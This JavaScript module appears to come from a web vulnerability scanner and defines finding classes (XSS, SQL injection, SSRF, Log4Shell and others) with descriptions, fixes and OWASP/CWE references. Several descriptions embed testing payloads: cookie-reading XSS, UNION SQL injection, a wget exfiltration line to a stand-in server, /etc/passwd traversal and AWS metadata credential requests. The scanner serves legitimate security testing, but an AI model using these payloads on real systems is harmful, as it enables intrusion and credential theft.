// all vuln defintions

import { FindingBase } from './base.js';

// --- xss stuff ---

export class ReflectedXss extends FindingBase {
    static name() { return 'Reflected Cross Site Scripting'; }
    static shortName() { return 'XSS'; }
    static type() { return 'vulnerability'; }
    static wstgCode() { return ['WSTG-INPV-01']; }
    static description() {
        return 'Cross-site scripting (XSS) allows code injecton by malicious users into web pages viewed by other users. Examples include HTML code and client-side scripts.<br><br>' +
            '<b>Exploitation Verification:</b><br>' +
            '1. Try <code>"&gt;&lt;script&gt;alert(window.origin)&lt;/script&gt;</code> to confirm the origin context.<br>' +
            '2. Try <code>"&gt;&lt;img src=x onerror=prompt(document.cookie)&gt;</code> to test cookie access.';
    }
    static solution() {
        return 'Validate all headers, cookies, query strings, form fields. Encode user suplied output on the server side.';
    }
    static references() {
        return [
            { title: 'OWASP: Cross Site Scripting', url: 'https://owasp.org/www-community/attacks/xss/' },
            { title: 'CWE-79: XSS', url: 'https://cwe.mitre.org/data/definitions/79.html' },
        ];
    }
}

export class StoredXss extends FindingBase {
    static name() { return 'Stored Cross Site Scripting'; }
    static shortName() { return 'Stored XSS'; }
    static type() { return 'vulnerability'; }
    static wstgCode() { return ['WSTG-INPV-02']; }
    static description() {
        return 'Stored XSS occurs when malicous input is permanntly stored on the target server and served to other users.';
    }
    static solution() {
        return 'Sanitize all user input before storing it. Use output encoding when displayng stored data.';
    }
    static references() {
        return [
            { title: 'OWASP: Stored XSS', url: 'https://owasp.org/www-community/attacks/xss/' },
        ];
    }
}

export class HtmlInjection extends FindingBase {
    static name() { return 'HTML Injection'; }
    static shortName() { return 'HTML Injection'; }
    static type() { return 'vulnerability'; }
    static wstgCode() { return ['WSTG-INPV-03']; }
    static description() {
        return 'HTML injection allows an atacker to insert arbitrary HTML into a web page, potentialy leading to phishng or defacement.';
    }
    static solution() {
        return 'Sanitize user input and encode special HTML chracters before rendering.';
    }
    static references() {
        return [
            { title: 'CWE-79: HTML Injection', url: 'https://cwe.mitre.org/data/definitions/79.html' },
        ];
    }
}

export class StoredHtmlInjection extends FindingBase {
    static name() { return 'Stored HTML Injection'; }
    static shortName() { return 'Stored HTML Injection'; }
    static type() { return 'vulnerability'; }
    static wstgCode() { return ['WSTG-INPV-03']; }
    static description() {
        return 'Stored HTML injection occurs when malicous HTML is permanntly stored and served to other users.';
    }
    static solution() {
        return 'Sanitize all user input before storage and encode output.';
    }
    static references() {
        return [
            { title: 'CWE-79', url: 'https://cwe.mitre.org/data/definitions/79.html' },
        ];
    }
}

// --- injection stuff ---

export class SqlInjection extends FindingBase {
    static name() { return 'SQL Injection'; }
    static shortName() { return 'SQLI'; }
    static type() { return 'vulnerability'; }
    static wstgCode() { return ['WSTG-INPV-05']; }
    static description() {
        return 'SQL injection lets an atacker alter queries executed on the backend databse. May allow data extracton or privilege escaltion.<br><br>' +
            '<b>Exploitation Extration:</b><br>' +
            '1. Try <code>ORDER BY 10--</code> to find logical column count.<br>' +
            '2. Try <code>UNION SELECT 1,database(),table_name,4 FROM information_schema.tables--</code> to extract schemas.<br>' +
            '3. Sqlmap via: <code>sqlmap -u "&lt;url&gt;" -p &lt;param&gt; --dbs</code>';
    }
    static solution() {
        return 'Use paramterized statements. Never embed user input directly in SQL.';
    }
    static references() {
        return [
            { title: 'OWASP: SQL Injection', url: 'https://owasp.org/www-community/attacks/SQL_Injection' },
            { title: 'CWE-89: SQL Injection', url: 'https://cwe.mitre.org/data/definitions/89.html' },
        ];
    }
}

export class BlindSqlInjection extends FindingBase {
    static name() { return 'Blind SQL Injection'; }
    static shortName() { return 'Blind SQLI'; }
    static type() { return 'vulnerability'; }
    static wstgCode() { return ['WSTG-INPV-05']; }
    static description() {
        return 'Time-based blind SQL injection where the databse respnse time reveals information.';
    }
    static solution() {
        return 'Use paramterized queries and input validaton.';
    }
    static references() {
        return [
            { title: 'OWASP: Blind SQL Injection', url: 'https://owasp.org/www-community/attacks/Blind_SQL_Injection' },
        ];
    }
}

export class CommandExecution extends FindingBase {
    static name() { return 'Command Execution'; }
    static shortName() { return 'Exec'; }
    static type() { return 'vulnerability'; }
    static wstgCode() { return ['WSTG-INPV-12']; }
    static description() {
        return 'OS command injection allows an atacker to execute arbitrary comands on the host operting system.<br><br>' +
            '<b>Exploitation Verification:</b><br>' +
            '1. Try injecting sleep delays: <code>;sleep 10;</code> or <code>| ping -c 10 127.0.0.1</code><br>' +
            '2. Try extracting user identities: <code>;id</code> or <code>`whoami`</code><br>' +
            '3. Out-of-band extraction: <code>;wget http://your-server.com/?data=$(whoami)</code>';
    }
    static solution() {
        return 'Avoid calling OS comands with user suplied input. Use paramterized APIs instead.';
    }
    static references() {
        return [
            { title: 'OWASP: Command Injection', url: 'https://owasp.org/www-community/attacks/Command_Injection' },
            { title: 'CWE-78: OS Command Injection', url: 'https://cwe.mitre.org/data/definitions/78.html' },
        ];
    }
}

export class LdapInjection extends FindingBase {
    static name() { return 'LDAP Injection'; }
    static shortName() { return 'LDAP'; }
    static type() { return 'vulnerability'; }
    static wstgCode() { return ['WSTG-INPV-06']; }
    static description() {
        return 'LDAP injection allows an atacker to modify LDAP querys usng user input.';
    }
    static solution() {
        return 'Sanitize user input befroe using it in LDAP queries.';
    }
    static references() {
        return [
            { title: 'OWASP: LDAP Injection', url: 'https://owasp.org/www-community/attacks/LDAP_Injection' },
        ];
    }
}

export class XpathInjection extends FindingBase {
    static name() { return 'XPath Injection'; }
    static shortName() { return 'XPath'; }
    static type() { return 'vulnerability'; }
    static wstgCode() { return ['WSTG-INPV-09']; }
    static description() {
        return 'XPath injection allows an atacker to modify XPath querys to extract data.';
    }
    static solution() {
        return 'Use paramterized XPath queries.';
    }
    static references() {
        return [
            { title: 'OWASP: XPath Injection', url: 'https://owasp.org/www-community/attacks/XPATH_Injection' },
        ];
    }
}

// --- file/path stuff ---

export class FileInclusion extends FindingBase {
    static name() { return 'File Inclusion'; }
    static shortName() { return 'File'; }
    static type() { return 'vulnerability'; }
    static wstgCode() { return ['WSTG-INPV-11']; }
    static description() {
        return 'Path traversal or file inclusion allows an atacker to access files outside the intended directry.<br><br>' +
            '<b>Exploitation Verification:</b><br>' +
            '1. For Linux targets try reading root system files: <code>../../../../../../etc/passwd</code><br>' +
            '2. For Windows targets try: <code>..\\..\\..\\..\\..\\Windows\\win.ini</code><br>' +
            '3. Check for PHP wrappers (LFI to RCE): <code>php://filter/convert.base64-encode/resource=index.php</code>';
    }
    static solution() {
        return 'Validate file paths and use a whitelist of allowd files.';
    }
    static references() {
        return [
            { title: 'OWASP: Path Traversal', url: 'https://owasp.org/www-community/attacks/Path_Traversal' },
            { title: 'CWE-22: Path Traversal', url: 'https://cwe.mitre.org/data/definitions/22.html' },
        ];
    }
}

export class BackupFile extends FindingBase {
    static name() { return 'Backup File'; }
    static shortName() { return 'Backup'; }
    static type() { return 'vulnerability'; }
    static wstgCode() { return ['WSTG-CONF-04']; }
    static description() {
        return 'Backup files left on the server can expose source code or senstive configuration.';
    }
    static solution() {
        return 'Remove backup files from producton servers.';
    }
    static references() {
        return [
            { title: 'OWASP: Review Old Backup Files', url: 'https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/04-Review_Old_Backup_and_Unreferenced_Files_for_Sensitive_Information' },
        ];
    }
}

export class BusterFinding extends FindingBase {
    static name() { return 'Hidden Resource'; }
    static shortName() { return 'Buster'; }
    static type() { return 'additional'; }
    static wstgCode() { return ['WSTG-CONF-04']; }
    static description() {
        return 'A hidden file or directry was discoverd through brute force.';
    }
    static solution() {
        return 'Remove unecesary files and restrict access to senstive resources.';
    }
    static references() { return []; }
}

export class UnrestrictedUpload extends FindingBase {
    static name() { return 'Unrestricted File Upload'; }
    static shortName() { return 'Upload'; }
    static type() { return 'vulnerability'; }
    static wstgCode() { return ['WSTG-BUSL-08']; }
    static description() {
        return 'The applicaton allows uploading dangerus file types without proper validaton.';
    }
    static solution() {
        return 'Validate file extensions, content types, and scan uploaded files.';
    }
    static references() {
        return [
            { title: 'OWASP: Unrestricted File Upload', url: 'https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload' },
        ];
    }
}

// --- redirect and ssrf ---

export class OpenRedirect extends FindingBase {
    static name() { return 'Open Redirect'; }
    static shortName() { return 'Redirect'; }
    static type() { return 'vulnerability'; }
    static wstgCode() { return ['WSTG-CLNT-04']; }
    static description() {
        return 'Open redirect allows an atacker to redirect users to malicous websites.<br><br>' +
            '<b>Exploitation Verification:</b><br>' +
            '1. Try redirecting to external sites: <code>https://evil.com</code> or <code>//evil.com</code><br>' +
            '2. Try Javascript scheme for XSS: <code>javascript:prompt(document.cookie)</code><br>' +
            '3. Try bypassing domain filters: <code>https://expected-domain.com.evil.com</code>';
    }
    static solution() {
        return 'Validate redirect URLs against a whitelist of allowd destinations.';
    }
    static references() {
        return [
            { title: 'CWE-601: Open Redirect', url: 'https://cwe.mitre.org/data/definitions/601.html' },
        ];
    }
}

export class Ssrf extends FindingBase {
    static name() { return 'Server Side Request Forgery'; }
    static shortName() { return 'SSRF'; }
    static type() { return 'vulnerability'; }
    static wstgCode() { return ['WSTG-INPV-19']; }
    static description() {
        return 'SSRF allows an atacker to make the server send requests to unintendded locations.<br><br>' +
            '<b>Exploitation Verification:</b><br>' +
            '1. Try interacting with local services: <code>http://127.0.0.1:22</code> or <code>http://localhost:6379</code><br>' +
            '2. Try reading AWS Cloud metadata: <code>http://169.254.169.254/latest/meta-data/iam/security-credentials/</code><br>' +
            '3. Try using alternate schemes: <code>file:///etc/passwd</code> or <code>dict://localhost:11211/stat</code>';
    }
    static solution() {
        return 'Validate and sanitize user-suplied URLs. Use allowlists for outgoing conections.';
    }
    static references() {
        return [
            { title: 'OWASP: SSRF', url: 'https://owasp.org/www-community/attacks/Server_Side_Request_Forgery' },
        ];
    }
}

// --- csrf and crlf ---

export class Csrf extends FindingBase {
    static name() { return 'Cross Site Request Forgery'; }
    static shortName() { return 'CSRF'; }
    static type() { return 'vulnerability'; }
    static wstgCode() { return ['WSTG-SESS-05']; }
    static description() {
        return 'CSRF forces an end user to execute unwated actions on a web app they are authenticaed to.';
    }
    static solution() {
        return 'Use anti-CSRF tokns in forms and verify the Origin/Referer headers.';
    }
    static references() {
        return [
            { title: 'OWASP: CSRF', url: 'https://owasp.org/www-community/attacks/csrf' },
            { title: 'CWE-352: CSRF', url: 'https://cwe.mitre.org/data/definitions/352.html' },
        ];
    }
}

export class Crlf extends FindingBase {
    static name() { return 'CRLF Injection'; }
    static shortName() { return 'CRLF'; }
    static type() { return 'vulnerability'; }
    static wstgCode() { return ['WSTG-INPV-15']; }
    static description() {
        return 'CRLF injection allows an atacker to inject carriage return and line feed charactrs into HTTP headers.';
    }
    static solution() {
        return 'Sanitize user input to remove CR and LF charactrs from header values.';
    }
    static references() {
        return [
            { title: 'OWASP: CRLF Injection', url: 'https://owasp.org/www-community/vulnerabilities/CRLF_Injection' },
        ];
    }
}

// --- ssl and headers ---

export class SslFinding extends FindingBase {
    static name() { return 'SSL/TLS Issue'; }
    static shortName() { return 'SSL'; }
    static type() { return 'vulnerability'; }
    static wstgCode() { return ['WSTG-CRYP-01']; }
    static description() {
        return 'Issues with the SSL/TLS configuraton that could weaken encryptoin.';
    }
    static solution() {
        return 'Use strong cipher suites, disable old protcols, and keep certifictes up to date.';
    }
    static references() {
        return [
            { title: 'OWASP: TLS Testing', url: 'https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/01-Testing_for_Weak_Transport_Layer_Security' },
        ];
    }
}

export class HttpHeaders extends FindingBase {
    static name() { return 'HTTP Security Header Missing'; }
    static shortName() { return 'Headers'; }
    static type() { return 'anomaly'; }
    static wstgCode() { return ['WSTG-CONF-07']; }
    static description() {
        return 'One or more security-related HTTP headers are missing from the server respnse.';
    }
    static solution() {
        return 'Add security headers like Content-Security-Policy, X-Frame-Options, X-Content-Type-Options.';
    }
    static references() {
        return [
            { title: 'OWASP: Security Headers', url: 'https://owasp.org/www-project-secure-headers/' },
        ];
    }
}

export class CspFinding extends FindingBase {
    static name() { return 'Content Security Policy Issue'; }
    static shortName() { return 'CSP'; }
    static type() { return 'anomaly'; }
    static wstgCode() { return ['WSTG-CONF-12']; }
    static description() {
        return 'The Content Security Policy header is missing or misconfigred.';
    }
    static solution() {
        return 'Implement a strict CSP that limits where resources can be loadd from.';
    }
    static references() {
        return [
            { title: 'MDN: CSP', url: 'https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP' },
        ];
    }
}

export class Htaccess extends FindingBase {
    static name() { return 'Htaccess Bypass'; }
    static shortName() { return 'Htaccess'; }
    static type() { return 'vulnerability'; }
    static wstgCode() { return ['WSTG-CONF-01']; }
    static description() {
        return 'The .htaccess configuraton can be bypased to access restriced content.';
    }
    static solution() {
        return 'Review server configuraton and ensure access contrls are properly enforceed.';
    }
    static references() { return []; }
}

export class HttpMethods extends FindingBase {
    static name() { return 'Uncommon HTTP Methods'; }
    static shortName() { return 'Methods'; }
    static type() { return 'anomaly'; }
    static wstgCode() { return ['WSTG-CONF-06']; }
    static description() {
        return 'Uncommon HTTP methods like PUT, DELETE, or TRACE are enabled on the server.';
    }
    static solution() {
        return 'Disable unneeded HTTP methods in the server configuraton.';
    }
    static references() { return []; }
}

// --- cookie stuff ---

export class SecureCookie extends FindingBase {
    static name() { return 'Cookie Without Secure Flag'; }
    static shortName() { return 'Secure Cookie'; }
    static type() { return 'anomaly'; }
    static wstgCode() { return ['WSTG-SESS-02']; }
    static description() {
        return 'A cookie is being set without the Secure flag, meaning it can be transmited over unencrypted conections.';
    }
    static solution() {
        return 'Set the Secure flag on all senstive cookies.';
    }
    static references() { return []; }
}

export class HttpOnlyCookie extends FindingBase {
    static name() { return 'Cookie Without HttpOnly Flag'; }
    static shortName() { return 'HttpOnly'; }
    static type() { return 'anomaly'; }
    static wstgCode() { return ['WSTG-SESS-02']; }
    static description() {
        return 'A cookie is being set without the HttpOnly flag, making it accesible to JavaScript.';
    }
    static solution() {
        return 'Set the HttpOnly flag on senstive cookies to prevent XSS-based theft.';
    }
    static references() { return []; }
}

// --- special vulns ---

export class Shellshock extends FindingBase {
    static name() { return 'Shellshock'; }
    static shortName() { return 'Shellshock'; }
    static type() { return 'vulnerability'; }
    static wstgCode() { return ['WSTG-INPV-12']; }
    static description() {
        return 'The target is vulnerble to Shellshock (CVE-2014-6271), allowing remote code executon through Bash.';
    }
    static solution() {
        return 'Update Bash to a patced version.';
    }
    static references() {
        return [
            { title: 'CVE-2014-6271', url: 'https://nvd.nist.gov/vuln/detail/CVE-2014-6271' },
        ];
    }
}

export class Spring4Shell extends FindingBase {
    static name() { return 'Spring4Shell'; }
    static shortName() { return 'Spring4Shell'; }
    static type() { return 'vulnerability'; }
    static wstgCode() { return ['WSTG-INPV-12']; }
    static description() {
        return 'The target is vulnerble to Spring4Shell (CVE-2022-22965), a remote code executon in Spring Framework.';
    }
    static solution() {
        return 'Update Spring Framework to versoin 5.3.18+ or 5.2.20+.';
    }
    static references() {
        return [
            { title: 'CVE-2022-22965', url: 'https://nvd.nist.gov/vuln/detail/CVE-2022-22965' },
        ];
    }
}

export class Log4Shell extends FindingBase {
    static name() { return 'Log4Shell'; }
    static shortName() { return 'Log4Shell'; }
    static type() { return 'vulnerability'; }
    static wstgCode() { return ['WSTG-INPV-11']; }
    static description() {
        return 'Apache Log4j2 <=2.14.1 JNDI features can be exploitd for remote code executon (CVE-2021-44228).';
    }
    static solution() {
        return 'Update Log4j to version 2.17.0+ or remove the JndiLookup class.';
    }
    static references() {
        return [
            { title: 'CVE-2021-44228', url: 'https://nvd.nist.gov/vuln/detail/CVE-2021-44228' },
        ];
    }
}

// --- fingerprinting and info ---

export class FingerprintWebApp extends FindingBase {
    static name() { return 'Web Application Fingerprint'; }
    static shortName() { return 'Fingerprint'; }
    static type() { return 'additional'; }
    static wstgCode() { return ['WSTG-INFO-08']; }
    static description() {
        return 'The web application technology and version was identifed.';
    }
    static solution() {
        return 'Remove version infromation from public-facing pages and headers.';
    }
    static references() { return []; }
}

export class FingerprintWebServer extends FindingBase {
    static name() { return 'Web Server Fingerprint'; }
    static shortName() { return 'Server'; }
    static type() { return 'additional'; }
    static wstgCode() { return ['WSTG-INFO-02']; }
    static description() {
        return 'The web server software and version was identifed.';
    }
    static solution() {
        return 'Suppress server version infromation in HTTP headers.';
    }
    static references() { return []; }
}

export class InformationDisclosure extends FindingBase {
    static name() { return 'Information Disclosure'; }
    static shortName() { return 'Info Disclosure'; }
    static type() { return 'anomaly'; }
    static wstgCode() { return ['WSTG-INFO-05']; }
    static description() {
        return 'Senstive information is being leaked in comments, error messages, or headers.';
    }
    static solution() {
        return 'Remove debug infromation, comments with senstive data, and verbose error messages.';
    }
    static references() { return []; }
}

export class InternalError extends FindingBase {
    static name() { return 'Internal Server Error'; }
    static shortName() { return 'Error 500'; }
    static type() { return 'anomaly'; }
    static wstgCode() { return ['WSTG-ERRH-01']; }
    static description() {
        return 'The server returned an interal error that may reveal infromation about the application.';
    }
    static solution() {
        return 'Implement custom error pages that dont reveal stack traces or debug info.';
    }
    static references() { return []; }
}

export class DangerousResource extends FindingBase {
    static name() { return 'Potentially Dangerous Resource'; }
    static shortName() { return 'Dangerous'; }
    static type() { return 'additional'; }
    static wstgCode() { return ['WSTG-CONF-04']; }
    static description() {
        return 'A potentialy dangerous file was found on the server (admin panel, debug page, etc).';
    }
    static solution() {
        return 'Remove or restrict access to administation interfaces and debug tools.';
    }
    static references() { return []; }
}

export class ResourceConsumption extends FindingBase {
    static name() { return 'Resource Consumption'; }
    static shortName() { return 'DoS'; }
    static type() { return 'anomaly'; }
    static wstgCode() { return ['WSTG-BUSL-09']; }
    static description() {
        return 'The application may be vulnerble to denial of service through resource consumtion.';
    }
    static solution() {
        return 'Implement rate limiting and resource usage caps.';
    }
    static references() { return []; }
}

export class Credentials extends FindingBase {
    static name() { return 'Weak Credentials'; }
    static shortName() { return 'Creds'; }
    static type() { return 'vulnerability'; }
    static wstgCode() { return ['WSTG-ATHN-07']; }
    static description() {
        return 'Weak or default credentails were discoverd that allow unauthorized access.';
    }
    static solution() {
        return 'Enforce strong password policys and change default credentails.';
    }
    static references() { return []; }
}

export class CleartextPassword extends FindingBase {
    static name() { return 'Cleartext Password Submission'; }
    static shortName() { return 'Cleartext'; }
    static type() { return 'anomaly'; }
    static wstgCode() { return ['WSTG-CRYP-03']; }
    static description() {
        return 'A login form submits credentails over an unencryted HTTP conection.';
    }
    static solution() {
        return 'Serve login forms exclusively over HTTPS.';
    }
    static references() { return []; }
}

export class HttpsRedirect extends FindingBase {
    static name() { return 'Missing HTTPS Redirect'; }
    static shortName() { return 'HTTPS'; }
    static type() { return 'anomaly'; }
    static wstgCode() { return ['WSTG-CONF-07']; }
    static description() {
        return 'The HTTP version of the site does not redirect to HTTPS.';
    }
    static solution() {
        return 'Configure a 301 redirect from HTTP to HTTPS.';
    }
    static references() { return []; }
}

export class InconsistentRedirection extends FindingBase {
    static name() { return 'Inconsistent Redirection'; }
    static shortName() { return 'Redirect'; }
    static type() { return 'anomaly'; }
    static wstgCode() { return ['WSTG-CONF-07']; }
    static description() {
        return 'The applicaton shows inconsistent redirect behavoir that could indicate misconfiguraton.';
    }
    static solution() {
        return 'Review redirect logic for consistancy.';
    }
    static references() { return []; }
}

export class SubdomainTakeover extends FindingBase {
    static name() { return 'Subdomain Takeover'; }
    static shortName() { return 'Takeover'; }
    static type() { return 'vulnerability'; }
    static wstgCode() { return ['WSTG-CONF-10']; }
    static description() {
        return 'A subdomain points to a service that can be clamed by an atacker.';
    }
    static solution() {
        return 'Remove dangling DNS records poiting to unclaimed servces.';
    }
    static references() { return []; }
}

export class NsTakeover extends FindingBase {
    static name() { return 'NS Subdomain Takeover'; }
    static shortName() { return 'NS Takeover'; }
    static type() { return 'vulnerability'; }
    static wstgCode() { return ['WSTG-CONF-10']; }
    static description() {
        return 'A nameserver record points to a service that can be clamed.';
    }
    static solution() {
        return 'Remove or update dangling NS records.';
    }
    static references() { return []; }
}

export class VulnerableSoftwareVersion extends FindingBase {
    static name() { return 'Vulnerable Software Version'; }
    static shortName() { return 'Version'; }
    static type() { return 'additional'; }
    static wstgCode() { return ['WSTG-INFO-08']; }
    static description() {
        return 'A known vulnerble software version was detectd.';
    }
    static solution() {
        return 'Update the software to the latest patched version.';
    }
    static references() { return []; }
}

export class Fingerprint extends FindingBase {
    static name() { return 'Technology Fingerprint'; }
    static shortName() { return 'Tech'; }
    static type() { return 'additional'; }
    static wstgCode() { return ['WSTG-INFO-08']; }
    static description() {
        return 'A web technology or framwork was identifed.';
    }
    static solution() {
        return 'Minimize technology fingerprints visible to users.';
    }
    static references() { return []; }
}

// master lookup map - maps vuln names to their defintion classes
export const DEFINITIONS = {
    'Reflected Cross Site Scripting': ReflectedXss,
    'Stored Cross Site Scripting': StoredXss,
    'HTML Injection': HtmlInjection,
    'Stored HTML Injection': StoredHtmlInjection,
    'SQL Injection': SqlInjection,
    'Blind SQL Injection': BlindSqlInjection,
    'Command Execution': CommandExecution,
    'LDAP Injection': LdapInjection,
    'XPath Injection': XpathInjection,
    'File Inclusion': FileInclusion,
    'Backup File': BackupFile,
    'Hidden Resource': BusterFinding,
    'Unrestricted File Upload': UnrestrictedUpload,
    'Open Redirect': OpenRedirect,
    'Server Side Request Forgery': Ssrf,
    'Cross Site Request Forgery': Csrf,
    'CRLF Injection': Crlf,
    'SSL/TLS Issue': SslFinding,
    'HTTP Security Header Missing': HttpHeaders,
    'Content Security Policy Issue': CspFinding,
    'Htaccess Bypass': Htaccess,
    'Uncommon HTTP Methods': HttpMethods,
    'Cookie Without Secure Flag': SecureCookie,
    'Cookie Without HttpOnly Flag': HttpOnlyCookie,
    'Shellshock': Shellshock,
    'Spring4Shell': Spring4Shell,
    'Log4Shell': Log4Shell,
    'Web Application Fingerprint': FingerprintWebApp,
    'Web Server Fingerprint': FingerprintWebServer,
    'Information Disclosure': InformationDisclosure,
    'Internal Server Error': InternalError,
    'Potentially Dangerous Resource': DangerousResource,
    'Resource Consumption': ResourceConsumption,
    'Weak Credentials': Credentials,
    'Cleartext Password Submission': CleartextPassword,
    'Missing HTTPS Redirect': HttpsRedirect,
    'Inconsistent Redirection': InconsistentRedirection,
    'Subdomain Takeover': SubdomainTakeover,
    'NS Subdomain Takeover': NsTakeover,
    'Vulnerable Software Version': VulnerableSoftwareVersion,
    'Technology Fingerprint': Fingerprint,
};
